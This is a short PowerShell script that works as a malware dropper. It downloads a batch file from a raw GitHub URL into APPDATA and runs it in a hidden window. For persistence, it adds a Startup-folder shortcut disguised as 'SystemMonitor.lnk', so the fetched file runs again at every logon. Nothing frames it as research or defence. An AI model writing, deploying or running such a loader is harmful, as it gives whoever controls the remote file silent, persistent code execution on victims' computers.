$githubUrl = "https://raw.githubusercontent.com/Axolotl-in-void/powerhell/main/ss.bat"
$startupFolder = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
$batPath = "$env:APPDATA\ss.bat"

try {
    Invoke-WebRequest -Uri $githubUrl -OutFile $batPath -UseBasicParsing
} catch { exit }

$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut("$startupFolder\SystemMonitor.lnk")
$shortcut.TargetPath = $batPath
$shortcut.WindowStyle = 7
$shortcut.Save()

# Run detached
Start-Process $batPath -WindowStyle Hidden

exit
